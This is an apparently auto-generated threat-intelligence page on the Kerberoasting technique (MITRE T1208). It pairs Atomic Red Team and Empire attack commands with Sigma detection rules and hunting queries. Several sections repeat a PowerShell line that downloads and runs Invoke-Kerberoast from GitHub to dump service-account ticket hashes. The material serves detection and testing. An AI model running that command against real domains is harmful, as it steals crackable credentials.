
# Kerberoasting

## Description

### MITRE Description

> Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service (Citation: Microsoft Detecting Kerberoasting Feb 2018)). (Citation: Microsoft SPN) (Citation: Microsoft SetSPN) (Citation: SANS Attacking Kerberos Nov 2014) (Citation: Harmj0y Kerberoast Nov 2016)

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). (Citation: Empire InvokeKerberoast Oct 2016) (Citation: AdSecurity Cracking Kerberos Dec 2015) Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline [Brute Force](https://attack.mitre.org/techniques/T1110) attacks that may expose plaintext credentials. (Citation: AdSecurity Cracking Kerberos Dec 2015) (Citation: Empire InvokeKerberoast Oct 2016) (Citation: Harmj0y Kerberoast Nov 2016)

This same attack could be executed using service tickets captured from network traffic. (Citation: AdSecurity Cracking Kerberos Dec 2015)

Cracked hashes may enable Persistence, Privilege Escalation, and  Lateral Movement via access to [Valid Accounts](https://attack.mitre.org/techniques/T1078). (Citation: SANS Attacking Kerberos Nov 2014)

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: intentionally left blank
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: intentionally left blank
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1208

## Potential Commands

```
iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
Invoke-Kerberoast | fl

powershell/credentials/invoke_kerberoast
powershell/credentials/invoke_kerberoast
```

## Commands Dataset

```
[{'command': 'iex(iwr '
             'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)\n'
             'Invoke-Kerberoast | fl\n',
  'name': None,
  'source': 'atomics/T1208/T1208.yaml'},
 {'command': 'powershell/credentials/invoke_kerberoast',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/credentials/invoke_kerberoast',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Markus Neis, keepwatch',
                  'date': '2018/11/14',
                  'description': 'Detects Service Principal Name Enumeration '
                                 'used for Kerberoasting',
                  'detection': {'cmd': {'CommandLine': '*-q*'},
                                'condition': '(selection_image or '
                                             'selection_desc) and cmd',
                                'selection_desc': {'Description': '*Query or '
                                                                  'reset the '
                                                                  'computer* '
                                                                  'SPN '
                                                                  'attribute*'},
                                'selection_image': {'Image': '*\\setspn.exe'}},
                  'falsepositives': ['Administrator Activity'],
                  'id': '1eeed653-dbc8-4187-ad0c-eeebb20e6599',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://p16.praetorian.com/blog/how-to-use-kerberoasting-t1208-for-privilege-escalation'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1208'],
                  'title': 'Possible SPN Enumeration'}},
 {'data_source': {'description': 'Detects service ticket requests using RC4 '
                                 'encryption type',
                  'detection': {'condition': 'selection and not reduction',
                                'reduction': [{'ServiceName': '$*'}],
                                'selection': {'EventID': 4769,
                                              'TicketEncryptionType': '0x17',
                                              'TicketOptions': '0x40810000'}},
                  'falsepositives': ['Service accounts used on legacy systems '
                                     '(e.g. NetApp)',
                                     'Windows Domains with DFL 2003 and legacy '
                                     'systems'],
                  'id': '496a0e47-0a33-4dca-b009-9e6ca3591f39',
                  'level': 'medium',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'references': ['https://adsecurity.org/?p=3458',
                                 'https://www.trimarcsecurity.com/single-post/TrimarcResearch/Detecting-Kerberoasting-Activity'],
                  'status': 'experimental',
                  'tags': ['attack.credential_access', 'attack.t1208'],
                  'title': 'Suspicious Kerberos RC4 Ticket Encryption'}}]
```

## Potential Queries

```json
[{'name': 'Yml',
  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
  'query': 'Yml\n'
           'title: kerberos weak encryption\n'
           'description: domain environment test\n'
           'references: https://adsecurity.org/?p=3458\n'
           'status: experimental\n'
           'author: 12306Bro\n'
           'logsource:\n'
           '\xa0\xa0\xa0\xa0product: windows\n'
           '\xa0\xa0\xa0\xa0service: security\n'
           'detection:\n'
           '\xa0\xa0\xa0\xa0selection:\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0EventID: 4769 #kerberos Service '
           'Ticket Request\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0TicketOptions: 0x40810000 # '
           'Additional information> Ticket Options\n'
           '\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0TicketEncryptiontype: 0x17 # '
           'Additional information> Ticket Encryption Type\n'
           '\xa0\xa0\xa0\xa0reduction:\n'
           "\xa0\xa0\xa0\xa0\xa0\xa0\xa0\xa0- ServiceName: '$ *' # service "
           'name> service information\n'
           '\xa0\xa0\xa0\xa0condition: selection and not reduction\n'
           'level: medium'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Kerberoasting': {'atomic_tests': [{'description': 'This '
                                                                            'test '
                                                                            'uses '
                                                                            'the '
                                                                            'Powershell '
                                                                            'Empire '
                                                                            'Module: '
                                                                            'https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1\n'
                                                                            '\n'
                                                                            'The '
                                                                            'following '
                                                                            'are '
                                                                            'further '
                                                                            'sources '
                                                                            'and '
                                                                            'credits '
                                                                            'for '
                                                                            'this '
                                                                            'attack:\n'
                                                                            '[Kerberoasting '
                                                                            'Without '
                                                                            'Mimikatz '
                                                                            'source] '
                                                                            '(https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/)\n'
                                                                            '[Invoke-Kerberoast '
                                                                            'source] '
                                                                            '(https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)\n'
                                                                            'when '
                                                                            'executed '
                                                                            'successfully '
                                                                            ', '
                                                                            'the '
                                                                            'test '
                                                                            'displays '
                                                                            'available '
                                                                            'services '
                                                                            'with '
                                                                            'their '
                                                                            'hashes. \n'
                                                                            'If '
                                                                            'the '
                                                                            'testing '
                                                                            'domain '
                                                                            "doesn't "
                                                                            'have '
                                                                            'any '
                                                                            'service '
                                                                            'principal '
                                                                            'name '
                                                                            'configured, '
                                                                            'there '
                                                                            'is '
                                                                            'no '
                                                                            'output \n',
                                                             'executor': {'command': 'iex(iwr '
                                                                                     'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)\n'
                                                                                     'Invoke-Kerberoast '
                                                                                     '| '
                                                                                     'fl\n',
                                                                          'elevation_required': False,
                                                                          'name': 'powershell'},
                                                             'name': 'Request '
                                                                     'for '
                                                                     'service '
                                                                     'tickets',
                                                             'supported_platforms': ['windows']}],
                                           'attack_technique': 'T1208',
                                           'display_name': 'Kerberoasting'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1208',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/credentials/invoke_kerberoast":  '
                                                                                 '["T1208"],',
                                            'Empire Module': 'powershell/credentials/invoke_kerberoast',
                                            'Technique': 'Kerberoasting'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations

None

# Actors

None
